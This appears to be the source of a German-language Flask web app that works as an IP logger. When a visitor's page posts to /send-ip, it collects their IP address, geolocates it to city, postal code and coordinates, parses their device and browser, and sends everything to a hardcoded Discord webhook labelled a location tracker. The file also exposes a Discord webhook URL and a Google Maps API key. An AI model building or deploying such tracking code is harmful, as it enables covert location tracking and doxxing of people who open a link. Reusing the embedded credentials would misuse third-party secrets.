from flask import Flask, render_template, request, jsonify
import requests
from datetime import datetime
import json
import time

app = Flask(__name__)

# DEIN DISCORD WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1529571642022560025/mxoBq18yGw7Vwp1Mu2ZJHsApOQsEHAKfmTUEMsBQgqgKk-fVN9fAJ7-3AKS3lBVXS5Ex"

def get_ip_info(ip):
    """Holt ALLE verfügbaren Daten zu einer IP"""
    try:
        # Mehr Daten von ip-api.com abrufen
        url = f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        response = requests.get(url, timeout=5)
        data = response.json()
        
        if data.get('status') == 'success':
            return {
                'ip': data.get('query', ip),
                'land': data.get('country', 'Unbekannt'),
                'land_code': data.get('countryCode', ''),
                'region': data.get('regionName', 'Unbekannt'),
                'stadt': data.get('city', 'Unbekannt'),
                'plz': data.get('zip', 'Unbekannt'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0),
                'timezone': data.get('timezone', 'Unbekannt'),
                'isp': data.get('isp', 'Unbekannt'),
                'org': data.get('org', 'Unbekannt'),
                'as': data.get('as', 'Unbekannt'),
                'asname': data.get('asname', 'Unbekannt'),
                'mobile': data.get('mobile', False),
                'proxy': data.get('proxy', False),
                'hosting': data.get('hosting', False),
                'maps_link': f"https://www.google.com/maps?q={data.get('lat', 0)},{data.get('lon', 0)}",
                # Static Map Bild (kleine Karte)
                'map_image': f"https://maps.googleapis.com/maps/api/staticmap?center={data.get('lat', 0)},{data.get('lon', 0)}&zoom=12&size=400x200&markers=color:red%7C{data.get('lat', 0)},{data.get('lon', 0)}&key=AIzaSyA2gIPYy2oLLK8_khPe_0k8YbWw-XBtOC4"
            }
        return None
    except Exception as e:
        print(f"Fehler bei IP-API: {e}")
        return None

def get_user_agent_info(user_agent):
    """Extrahiert Geräte-Informationen aus dem User-Agent"""
    info = {
        'browser': 'Unbekannt',
        'os': 'Unbekannt',
        'device': 'Unbekannt'
    }
    
    if not user_agent:
        return info
    
    ua = user_agent.lower()
    
    # Browser erkennen
    if 'chrome' in ua and 'edg' not in ua and 'opr' not in ua:
        info['browser'] = 'Google Chrome'
    elif 'firefox' in ua:
        info['browser'] = 'Mozilla Firefox'
    elif 'safari' in ua and 'chrome' not in ua:
        info['browser'] = 'Apple Safari'
    elif 'edg' in ua:
        info['browser'] = 'Microsoft Edge'
    elif 'opr' in ua or 'opera' in ua:
        info['browser'] = 'Opera'
    
    # Betriebssystem erkennen
    if 'windows' in ua:
        if 'windows nt 10.0' in ua:
            info['os'] = 'Windows 10/11'
        elif 'windows nt 6.1' in ua:
            info['os'] = 'Windows 7'
        elif 'windows nt 6.2' in ua or 'windows nt 6.3' in ua:
            info['os'] = 'Windows 8/8.1'
        else:
            info['os'] = 'Windows'
    elif 'mac os' in ua:
        info['os'] = 'macOS'
    elif 'linux' in ua and 'android' not in ua:
        info['os'] = 'Linux'
    elif 'android' in ua:
        info['os'] = 'Android'
    elif 'iphone' in ua or 'ipad' in ua:
        info['os'] = 'iOS'
    
    # Gerätetyp erkennen
    if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
        info['device'] = '📱 Mobilgerät'
    elif 'tablet' in ua or 'ipad' in ua:
        info['device'] = '📱 Tablet'
    else:
        info['device'] = '💻 Desktop'
    
    return info

@app.route('/preview')
def preview():
    return render_template('preview.html')

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/einwilligung')
def einwilligung():
    return render_template('einwilligung.html')

@app.route('/send-ip', methods=['POST'])
def send_ip():
    try:
        ip = request.remote_addr
        if request.headers.get('X-Forwarded-For'):
            ip = request.headers.get('X-Forwarded-For').split(',')[0]
        
        user_agent = request.headers.get('User-Agent', 'Unbekannt')
        zeit = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
        
        # ALLE Daten sammeln
        ip_info = get_ip_info(ip)
        device_info = get_user_agent_info(user_agent)
        
        # Discord Embed erstellen (ULTRA COOL!)
        embed = {
            "title": "📍 Standort wurde erfasst!",
            "color": 0x00ff88,  # Türkis-Grün
            "timestamp": datetime.now().isoformat(),
            "thumbnail": {
                "url": "https://cdn-icons-png.flaticon.com/512/3176/3176366.png"
            },
            "fields": [],
            "footer": {
                "text": "⚡ Powered by ip-api.com",
                "icon_url": "https://cdn-icons-png.flaticon.com/512/1387/1387525.png"
            }
        }
        
        # Basisdaten (immer)
        embed["fields"].append({
            "name": "🌐 **IP-Adresse**",
            "value": f"`{ip}`",
            "inline": False
        })
        
        # Standort-Daten (wenn verfügbar)
        if ip_info:
            # Standort-Info
            location_text = f"**{ip_info['stadt']}**"
            if ip_info.get('region'):
                location_text += f", {ip_info['region']}"
            location_text += f"\n{ip_info['land']} {ip_info.get('land_code', '')}"
            if ip_info.get('plz'):
                location_text += f"\n📮 PLZ: {ip_info['plz']}"
            
            embed["fields"].append({
                "name": "📍 **Standort**",
                "value": location_text,
                "inline": True
            })
            
            # Koordinaten
            embed["fields"].append({
                "name": "📌 **Koordinaten**",
                "value": f"**Lat:** {ip_info['lat']}\n**Lon:** {ip_info['lon']}",
                "inline": True
            })
            
            # ISP & Organisation
            isp_text = ip_info.get('isp', 'Unbekannt')
            if ip_info.get('org') and ip_info['org'] != ip_info.get('isp'):
                isp_text += f"\n🏢 {ip_info['org']}"
            if ip_info.get('asname'):
                isp_text += f"\n🔗 {ip_info['asname']}"
            
            embed["fields"].append({
                "name": "🌍 **Netzwerk**",
                "value": isp_text,
                "inline": False
            })
            
            # Zusatzinfos
            extra_info = []
            if ip_info.get('timezone'):
                extra_info.append(f"🕐 Zeitzone: {ip_info['timezone']}")
            if ip_info.get('mobile'):
                extra_info.append("📱 Mobilfunk")
            if ip_info.get('proxy'):
                extra_info.append("🔒 Proxy erkannt")
            if ip_info.get('hosting'):
                extra_info.append("☁️ Hosting/Cloud")
            
            if extra_info:
                embed["fields"].append({
                    "name": "ℹ️ **Zusätzliche Infos**",
                    "value": "\n".join(extra_info),
                    "inline": False
                })
            
            # Google Maps Link
            embed["fields"].append({
                "name": "🗺️ **Google Maps**",
                "value": f"[📍 Karte anzeigen]({ip_info['maps_link']})",
                "inline": False
            })
            
            # Mini-Karte einbetten (als Bild)
            embed["image"] = {
                "url": ip_info['map_image']
            }
        
        else:
            # Fallback: Nur IP + Maps
            embed["fields"].append({
                "name": "📍 **Standort**",
                "value": "❌ Konnte nicht ermittelt werden",
                "inline": True
            })
            embed["fields"].append({
                "name": "🗺️ **Google Maps (ungefähr)**",
                "value": f"[📍 Karte anzeigen](https://www.google.com/maps?q={ip})",
                "inline": False
            })
        
        # Geräte-Informationen
        embed["fields"].append({
            "name": "💻 **Gerät**",
            "value": f"**{device_info['device']}**\n🖥️ {device_info['os']}\n🌐 {device_info['browser']}",
            "inline": True
        })
        
        # Zeit
        embed["fields"].append({
            "name": "🕐 **Besuchszeit**",
            "value": zeit,
            "inline": True
        })
        
        # Daten an Discord senden
        data = {
            "embeds": [embed],
            "username": "📍 Standort-Tracker",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/3176/3176366.png"
        }
        
        response = requests.post(WEBHOOK_URL, json=data)
        
        if response.status_code in [200, 204]:
            return jsonify({"status": "success", "message": "IP + Standort wurden gesendet"})
        else:
            print(f"Discord Fehler: {response.status_code} - {response.text}")
            return jsonify({"status": "error", "message": "Fehler beim Senden"}), 500
            
    except Exception as e:
        print(f"Fehler: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=10000)
